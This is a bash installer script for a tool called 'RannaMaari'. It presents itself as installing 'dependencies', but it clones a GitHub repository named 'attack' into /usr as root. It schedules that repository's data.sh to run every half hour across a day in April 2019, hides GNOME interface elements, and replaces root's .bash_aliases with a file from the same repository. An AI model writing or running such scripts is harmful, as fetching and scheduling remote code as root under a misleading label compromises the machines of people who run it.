#/bin/bash
echo "Press Y if anything pops up to Install!! Those are Dependencies needed to run this Program!!"

apt-get install figlet

echo -e 'RannaMaari\nis\nHere' | figlet -f small -c

sleep 1

echo "The Dependencies are now installing!!"
sleep 5
apt-get update

apt-get install at

systemctl enable --now atd.service

cd /usr

git clone https://github.com/H-ministry/attack.git

cd /usr/attack

chmod +x data.sh
chmod +x RannaConsole.sh


at 08:00 AM April 10 2019 -f /usr/attack/data.sh
at 08:30 AM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 09:00 AM April 10 2019 -f /usr/attack/data.sh
at 09:30 AM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 10:00 AM April 10 2019 -f /usr/attack/data.sh
at 10:30 AM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 11:00 AM April 10 2019 -f /usr/attack/data.sh
at 11:30 AM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 12:00 PM April 10 2019 -f /usr/attack/data.sh
at 12:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 01:00 PM April 10 2019 -f /usr/attack/data.sh
at 01:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 02:00 PM April 10 2019 -f /usr/attack/data.sh
at 02:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 03:00 PM April 10 2019 -f /usr/attack/data.sh
at 03:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 04:00 PM April 10 2019 -f /usr/attack/data.sh
at 04:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 05:00 PM April 10 2019 -f /usr/attack/data.sh
at 05:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 06:00 PM April 10 2019 -f /usr/attack/data.sh
at 06:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 07:00 PM April 10 2019 -f /usr/attack/data.sh
at 07:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 08:00 PM April 10 2019 -f /usr/attack/data.sh
at 08:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 09:00 PM April 10 2019 -f /usr/attack/data.sh
at 09:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 10:00 PM April 10 2019 -f /usr/attack/data.sh
at 10:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 11:00 PM April 10 2019 -f /usr/attack/data.sh
at 11:30 PM April 10 2019 -f /usr/attack/data.sh
ifconfig
at 12:00 AM April 11 2019 -f /usr/attack/data.sh

reset

echo -e 'RannaMaari\nis\nHere' | figlet -f small -c

sleep 05

cd /usr/
git clone https://github.com/voronind/hide-top-panel.git
git clone https://github.com/HROMANO/nohotcorner.git
mv nohotcorner nohotcorner@azuri.free.fr

mkdir /root/.local/share/gnome-shell/extensions

cp -r /usr/hide-top-panel/hide-top-panel@dimka665.gmail.com /root/.local/share/gnome-shell/extensions/hide-top-panel@dimka665.gmail.com
cp -r /usr/nohotcorner@azuri.free.fr /root/.local/share/gnome-shell/extensions/nohotcorner@azuri.free.fr

echo "now you are Ready to use RannaMaari!!"
echo " "
echo " "
rm -f /root/.bash_aliases
cp /usr/attack/.bash_aliases /root/.bash_aliases
echo "Execute Raana_console to run the program. it is advised to restart your pc before running this program!!"
